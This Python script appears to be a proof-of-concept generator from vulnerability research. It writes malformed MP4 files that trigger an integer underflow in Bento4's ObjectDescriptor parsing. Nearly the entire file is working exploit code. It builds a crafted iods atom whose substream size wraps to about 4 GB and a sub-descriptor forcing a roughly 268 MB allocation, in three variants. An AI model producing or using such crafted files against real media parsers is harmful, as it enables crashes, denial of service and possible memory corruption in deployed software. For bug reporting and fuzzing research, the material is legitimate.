#!/usr/bin/env python3
"""
PoC generator for VULN 001:
AP4_ObjectDescriptor substream size integer underflow enables OOB file data parse.

Root cause (Ap4ObjectDescriptor.cpp lines 74-103):
    AP4_Position start;
    stream.Tell(start);
    unsigned short bits;
    stream.ReadUI16(bits);          // advances offset-start by 2
    ...
    AP4_Position offset;
    stream.Tell(offset);
    AP4_SubStream* substream = new AP4_SubStream(stream, offset,
                                                 payload_size-AP4_Size(offset-start));

With payload_size=0 and offset-start=2 (after ReadUI16):
    0 - 2 = 0xFFFFFFFE   (uint32_t underflow, wraps to ~4 GB)

This creates a massive SubStream that tries to parse sub-descriptors far beyond
the iods atom boundary.

KEY: The iods atom must contain at least 2 physical bytes after the OD tag+size
encoding so that ReadUI16 can read them successfully and advance the stream by 2,
making offset-start == 2.  Without this, ReadUI16 fails, sets bits=0, does not
advance the stream, and offset-start remains 0, so no underflow occurs.

We embed extra bytes INSIDE the iods atom (beyond the declared descriptor
payload_size=0) to supply the 2 bytes for ReadUI16, plus crafted bytes for the
SubStream to parse.

The crafted sub-descriptor inside the SubStream uses the maximum expandable-size
encoding (0xFF 0xFF 0xFF 0x7F = 0x0FFFFFFF, ~268 MB) to trigger a large
heap allocation attempt from AP4_UnknownDescriptor.

Variations tried:
  v1: OD tag=0x01, payload_size=0, huge sub-descriptor
  v2: OD tag=0x01, payload_size=1, huge sub-descriptor (offset-start=2, 1-2=0xFFFFFFFF)
  v3: OD tag=0x11 (MP4_OD), payload_size=0, huge sub-descriptor
"""

import struct
import os
import sys

POC_DIR = (
    "/data/ylwang/non-textfuzz/target/_poc/Bento4/"
    "Source_C++_Core_Ap4Command_h/"
)
OUT_FILE = POC_DIR + "vuln_001.mp4"


def make_box(box_type: bytes, payload: bytes) -> bytes:
    """Return a 4-byte big-endian size | 4-byte type | payload box."""
    size = 8 + len(payload)
    return struct.pack(">I4s", size, box_type) + payload


# ── ftyp ──────────────────────────────────────────────────────────────────────
ftyp_payload = b"mp41" + struct.pack(">I", 0) + b"mp41"
ftyp = make_box(b"ftyp", ftyp_payload)   # 20 bytes total


# ── mvhd (version=0, total=108 bytes) ─────────────────────────────────────────
identity_matrix = struct.pack(
    ">IIIIIIIII",
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000,
)
mvhd_payload = (
    b"\x00"                            # version=0
    + b"\x00\x00\x00"                 # flags=0
    + struct.pack(">I", 0)             # creation_time
    + struct.pack(">I", 0)             # modification_time
    + struct.pack(">I", 1000)          # timescale
    + struct.pack(">I", 0)             # duration
    + struct.pack(">I", 0x00010000)    # rate (1.0)
    + struct.pack(">H", 0x0100)        # volume (1.0)
    + b"\x00" * 10                     # reserved
    + identity_matrix                  # matrix (36 bytes)
    + b"\x00" * 24                     # pre_defined (24 bytes)
    + struct.pack(">I", 1)             # next_track_id
)
assert len(mvhd_payload) == 100, f"mvhd_payload is {len(mvhd_payload)} bytes, expected 100"
mvhd = make_box(b"mvhd", mvhd_payload)   # 108 bytes total
assert len(mvhd) == 108


# ── Helper: make iods atom ────────────────────────────────────────────────────
def make_iods(od_tag: int, od_payload_size_byte: int, extra_bytes: bytes) -> bytes:
    """
    Build an iods box that contains an ObjectDescriptor with the given tag and
    declared payload_size (single expandable-size byte), plus extra_bytes
    physically embedded in the iods box (but outside the declared payload).

    extra_bytes is split into:
      - first 2 bytes: consumed by ReadUI16 in the OD constructor
      - remaining bytes: read by the SubStream's descriptor loop
    """
    iods_payload = (
        b"\x00\x00\x00\x00"                          # version=0, flags=0
        + bytes([od_tag, od_payload_size_byte])       # descriptor tag + size byte
        + extra_bytes                                  # OD_ID bytes + SubStream data
    )
    return make_box(b"iods", iods_payload)


# ── Crafted bytes ─────────────────────────────────────────────────────────────
# 2 bytes for ReadUI16 (OD_ID=0, URL_flag=false):
oid_bytes = bytes([0x00, 0x00])

# 5 bytes encoding a descriptor with payload_size=0x0FFFFFFF (~268 MB):
#   tag=0xFF (routes to AP4_UnknownDescriptor)
#   expandable size: 0xFF 0xFF 0xFF 0x7F
#     payload_size = ((0<<7)+0x7F)<<7 = 0x3FFF ...
#     = 0x7F | (0x7F<<7) | (0x7F<<14) | (0x7F<<21) = 0x0FFFFFFF
huge_subdesc = bytes([0xFF, 0xFF, 0xFF, 0xFF, 0x7F])

extra = oid_bytes + huge_subdesc   # 7 bytes total


# ── Variant selector ──────────────────────────────────────────────────────────
# Default: OD tag=0x01, payload_size=0
variant = int(sys.argv[1]) if len(sys.argv) > 1 else 1

if variant == 1:
    # OD tag=0x01, declared payload_size=0
    # Underflow: 0 - 2 = 0xFFFFFFFE
    iods = make_iods(0x01, 0x00, extra)
    desc = "OD tag=0x01, payload_size=0 → 0-2=0xFFFFFFFE"

elif variant == 2:
    # OD tag=0x01, declared payload_size=1
    # One payload byte is embedded in extra bytes too.
    # ReadUI16 reads 1 payload byte + 1 OD_ID byte = advances by 2
    # Underflow: 1 - 2 = 0xFFFFFFFF
    payload_byte = bytes([0x00])   # 1 byte of "actual" payload (OD_ID MSB part)
    oid_bytes2 = bytes([0x00])     # remaining 1 byte for ReadUI16 low byte
    extra2 = payload_byte + oid_bytes2 + huge_subdesc
    iods = make_iods(0x01, 0x01, extra2)
    desc = "OD tag=0x01, payload_size=1 → 1-2=0xFFFFFFFF"

elif variant == 3:
    # MP4_OD tag=0x11, declared payload_size=0
    # Same underflow as variant 1 but with alternate tag
    iods = make_iods(0x11, 0x00, extra)
    desc = "MP4_OD tag=0x11, payload_size=0 → 0-2=0xFFFFFFFE"

else:
    print(f"Unknown variant {variant}")
    sys.exit(1)


# ── Assemble moov ─────────────────────────────────────────────────────────────
moov_payload = mvhd + iods
moov = make_box(b"moov", moov_payload)


# ── Final file ────────────────────────────────────────────────────────────────
mp4 = ftyp + moov

os.makedirs(POC_DIR, exist_ok=True)
with open(OUT_FILE, "wb") as f:
    f.write(mp4)

# Offsets for analysis
ftyp_end = len(ftyp)
moov_start = ftyp_end
mvhd_start = moov_start + 8
iods_start = mvhd_start + len(mvhd)
iods_hdr_end = iods_start + 8
ver_flags_end = iods_hdr_end + 4
od_tag_off = ver_flags_end
od_size_off = ver_flags_end + 1
oid_read_off = ver_flags_end + 2       # ReadUI16 reads from here
substream_off = ver_flags_end + 4      # SubStream m_Offset

print(f"[+] Written {len(mp4)} bytes to {OUT_FILE}")
print(f"    ftyp  : {len(ftyp)} bytes at offset 0")
print(f"    moov  : {len(moov)} bytes at offset {moov_start}")
print(f"      mvhd: {len(mvhd)} bytes at offset {mvhd_start}")
print(f"      iods: {len(iods)} bytes at offset {iods_start}")
print(f"        OD tag  @ offset {od_tag_off} = 0x{mp4[od_tag_off]:02X}")
print(f"        OD size @ offset {od_size_off} = 0x{mp4[od_size_off]:02X}")
print(f"        ReadUI16 reads from offset {oid_read_off}: "
      f"{mp4[oid_read_off]:02X} {mp4[oid_read_off+1]:02X}")
print(f"        SubStream m_Offset = {substream_off}")
print(f"        SubStream m_Size   = 0xFFFFFFFE (from 0 - 2 underflow)")
print(f"    variant: {desc}")
